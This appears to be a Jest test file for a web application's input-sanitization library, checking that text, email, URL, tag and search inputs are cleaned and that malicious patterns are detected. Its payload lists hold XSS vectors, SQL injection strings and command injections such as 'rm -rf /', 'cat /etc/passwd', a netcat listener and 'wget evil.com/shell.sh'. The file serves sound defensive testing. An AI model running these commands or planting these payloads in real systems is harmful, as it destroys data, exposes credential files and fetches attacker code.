import { describe, it, expect } from '@jest/globals';
import {
  sanitizeText,
  sanitizeEmail,
  sanitizeUrl,
  sanitizeDisplayName,
  sanitizeBio,
  sanitizePromptContent,
  sanitizeCommentContent,
  sanitizeSearchQuery,
  sanitizeTags,
  detectMaliciousPatterns,
  sanitizeRateLimitKey,
} from '@/lib/security/sanitize';

describe('Security Sanitization', () => {
  describe('sanitizeText', () => {
    it('should remove HTML tags when allowHtml is false', () => {
      const maliciousInput = '<script>alert("xss")</script>Hello';
      const result = sanitizeText(maliciousInput, { allowHtml: false });
      expect(result).not.toContain('<script>');
      expect(result).not.toContain('</script>');
    });

    it('should sanitize HTML when allowHtml is true', () => {
      const maliciousInput = '<script>alert("xss")</script><p>Safe content</p>';
      const result = sanitizeText(maliciousInput, { allowHtml: true });
      expect(result).not.toContain('<script>');
      expect(result).toContain('<p>Safe content</p>');
    });

    it('should trim whitespace', () => {
      const input = '  hello world  ';
      const result = sanitizeText(input, { trim: true });
      expect(result).toBe('hello world');
    });

    it('should normalize whitespace', () => {
      const input = 'hello    world\n\ntest';
      const result = sanitizeText(input, { normalizeWhitespace: true });
      expect(result).toBe('hello world test');
    });

    it('should respect max length', () => {
      const input = 'a'.repeat(100);
      const result = sanitizeText(input, { maxLength: 50 });
      expect(result.length).toBe(50);
    });

    it('should handle non-string input', () => {
      const result = sanitizeText(null as unknown as string);
      expect(result).toBe('');
    });
  });

  describe('sanitizeEmail', () => {
    it('should normalize valid emails', () => {
      const result = sanitizeEmail('  Test@Example.COM  ');
      expect(result).toBe('test@example.com');
    });

    it('should return empty string for invalid emails', () => {
      const result = sanitizeEmail('not-an-email');
      expect(result).toBe('');
    });

    it('should handle malicious email input', () => {
      const result = sanitizeEmail('<script>alert("xss")</script>@evil.com');
      expect(result).toBe('');
    });
  });

  describe('sanitizeUrl', () => {
    it('should allow valid HTTPS URLs', () => {
      const result = sanitizeUrl('https://example.com/path');
      expect(result).toBe('https://example.com/path');
    });

    it('should allow valid HTTP URLs', () => {
      const result = sanitizeUrl('http://example.com');
      expect(result).toBe('http://example.com');
    });

    it('should reject javascript: URLs', () => {
      const result = sanitizeUrl('javascript:alert("xss")');
      expect(result).toBe('');
    });

    it('should reject data: URLs', () => {
      const result = sanitizeUrl('data:text/html,<script>alert("xss")</script>');
      expect(result).toBe('');
    });

    it('should reject malformed URLs', () => {
      const result = sanitizeUrl('not-a-url');
      expect(result).toBe('');
    });
  });

  describe('sanitizeDisplayName', () => {
    it('should sanitize and limit length', () => {
      const input = '<script>alert("xss")</script>' + 'a'.repeat(200);
      const result = sanitizeDisplayName(input);
      expect(result).not.toContain('<script>');
      expect(result.length).toBeLessThanOrEqual(100);
    });
  });

  describe('sanitizeBio', () => {
    it('should limit bio length', () => {
      const input = 'a'.repeat(1000);
      const result = sanitizeBio(input);
      expect(result.length).toBeLessThanOrEqual(500);
    });
  });

  describe('sanitizePromptContent', () => {
    it('should allow basic HTML formatting', () => {
      const input = '<p>Safe content</p><script>alert("xss")</script>';
      const result = sanitizePromptContent(input);
      expect(result).toContain('<p>Safe content</p>');
      expect(result).not.toContain('<script>');
    });
  });

  describe('sanitizeCommentContent', () => {
    it('should remove all HTML', () => {
      const input = '<p>Comment</p><script>alert("xss")</script>';
      const result = sanitizeCommentContent(input);
      expect(result).not.toContain('<p>');
      expect(result).not.toContain('<script>');
    });

    it('should limit comment length', () => {
      const input = 'a'.repeat(5000);
      const result = sanitizeCommentContent(input);
      expect(result.length).toBeLessThanOrEqual(2000);
    });
  });

  describe('sanitizeSearchQuery', () => {
    it('should remove HTML and limit length', () => {
      const input = '<script>alert("xss")</script>' + 'search'.repeat(50);
      const result = sanitizeSearchQuery(input);
      expect(result).not.toContain('<script>');
      expect(result.length).toBeLessThanOrEqual(200);
    });
  });

  describe('sanitizeTags', () => {
    it('should sanitize individual tags', () => {
      const input = ['<script>evil</script>', 'good-tag', '  spaced  '];
      const result = sanitizeTags(input);
      expect(result).not.toContain('<script>evil</script>');
      expect(result).toContain('good-tag');
      expect(result).toContain('spaced');
    });

    it('should limit number of tags', () => {
      const input = Array(20).fill('tag');
      const result = sanitizeTags(input);
      expect(result.length).toBeLessThanOrEqual(10);
    });

    it('should handle non-array input', () => {
      const result = sanitizeTags('not-an-array' as unknown as string[]);
      expect(result).toEqual([]);
    });
  });

  describe('detectMaliciousPatterns', () => {
    it('should detect script injection attempts', () => {
      expect(detectMaliciousPatterns('<script>alert("xss")</script>')).toBe(true);
      expect(detectMaliciousPatterns('javascript:alert("xss")')).toBe(true);
      expect(detectMaliciousPatterns('vbscript:msgbox("xss")')).toBe(true);
    });

    it('should detect event handlers', () => {
      expect(detectMaliciousPatterns('<img onerror="alert(1)" src="x">')).toBe(true);
      expect(detectMaliciousPatterns('<div onclick="evil()">')).toBe(true);
    });

    it('should detect SQL injection patterns', () => {
      expect(detectMaliciousPatterns("'; DROP TABLE users; --")).toBe(true);
      expect(detectMaliciousPatterns('UNION SELECT * FROM passwords')).toBe(true);
    });

    it('should detect command injection patterns', () => {
      expect(detectMaliciousPatterns('test; rm -rf /')).toBe(true);
      expect(detectMaliciousPatterns('test && cat /etc/passwd')).toBe(true);
      expect(detectMaliciousPatterns('test `whoami`')).toBe(true);
    });

    it('should detect path traversal attempts', () => {
      expect(detectMaliciousPatterns('../../../etc/passwd')).toBe(true);
      expect(detectMaliciousPatterns('..\\..\\..\\windows\\system32')).toBe(true);
    });

    it('should not flag safe content', () => {
      expect(detectMaliciousPatterns('This is safe content')).toBe(false);
      expect(detectMaliciousPatterns('Email: user@example.com')).toBe(false);
      expect(detectMaliciousPatterns('Price: $10.99')).toBe(false);
    });

    it('should handle non-string input', () => {
      expect(detectMaliciousPatterns(null as unknown as string)).toBe(false);
      expect(detectMaliciousPatterns(undefined as unknown as string)).toBe(false);
    });
  });

  describe('sanitizeRateLimitKey', () => {
    it('should clean IP addresses', () => {
      expect(sanitizeRateLimitKey('192.168.1.1')).toBe('192.168.1.1');
      expect(sanitizeRateLimitKey('2001:db8::1')).toBe('2001:db8::1');
    });

    it('should remove malicious characters', () => {
      expect(sanitizeRateLimitKey('192.168.1.1; rm -rf /')).toBe('192.168.1.1');
      expect(sanitizeRateLimitKey('127.0.0.1<script>')).toBe('127.0.0.1');
    });
  });
});

describe('XSS Prevention Tests', () => {
  const xssPayloads = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(1)">',
    'javascript:alert("XSS")',
    '<svg onload="alert(1)">',
    '<iframe src="javascript:alert(1)">',
    '<body onload="alert(1)">',
    '<input onfocus="alert(1)" autofocus>',
    '<select onfocus="alert(1)" autofocus>',
    '<textarea onfocus="alert(1)" autofocus>',
    '<keygen onfocus="alert(1)" autofocus>',
    '<video><source onerror="javascript:alert(1)">',
    '<audio src="x" onerror="alert(1)">',
    '<details open ontoggle="alert(1)">',
    '<marquee onstart="alert(1)">',
  ];

  xssPayloads.forEach((payload, index) => {
    it(`should prevent XSS payload ${index + 1}: ${payload.substring(0, 30)}...`, () => {
      // Test with HTML disabled
      const sanitizedNoHtml = sanitizeText(payload, { allowHtml: false });
      expect(sanitizedNoHtml).not.toContain('<script');
      expect(sanitizedNoHtml).not.toContain('javascript:');
      expect(sanitizedNoHtml).not.toContain('onerror=');
      expect(sanitizedNoHtml).not.toContain('onload=');

      // Test with HTML enabled (should still be safe)
      const sanitizedWithHtml = sanitizeText(payload, { allowHtml: true });
      expect(sanitizedWithHtml).not.toContain('<script');
      expect(sanitizedWithHtml).not.toContain('javascript:');
      expect(sanitizedWithHtml).not.toContain('onerror=');
      expect(sanitizedWithHtml).not.toContain('onload=');

      // Should be detected as malicious
      expect(detectMaliciousPatterns(payload)).toBe(true);
    });
  });
});

describe('SQL Injection Prevention Tests', () => {
  const sqlPayloads = [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' UNION SELECT * FROM passwords --",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1#",
    "' or 1=1--",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",
  ];

  sqlPayloads.forEach((payload, index) => {
    it(`should detect SQL injection payload ${index + 1}: ${payload}`, () => {
      expect(detectMaliciousPatterns(payload)).toBe(true);
    });
  });
});

describe('Command Injection Prevention Tests', () => {
  const cmdPayloads = [
    '; rm -rf /',
    '&& cat /etc/passwd',
    '| nc -l 1234',
    '`whoami`',
    '$(id)',
    '; wget evil.com/shell.sh',
    '& powershell.exe',
  ];

  cmdPayloads.forEach((payload, index) => {
    it(`should detect command injection payload ${index + 1}: ${payload}`, () => {
      expect(detectMaliciousPatterns(payload)).toBe(true);
    });
  });
});
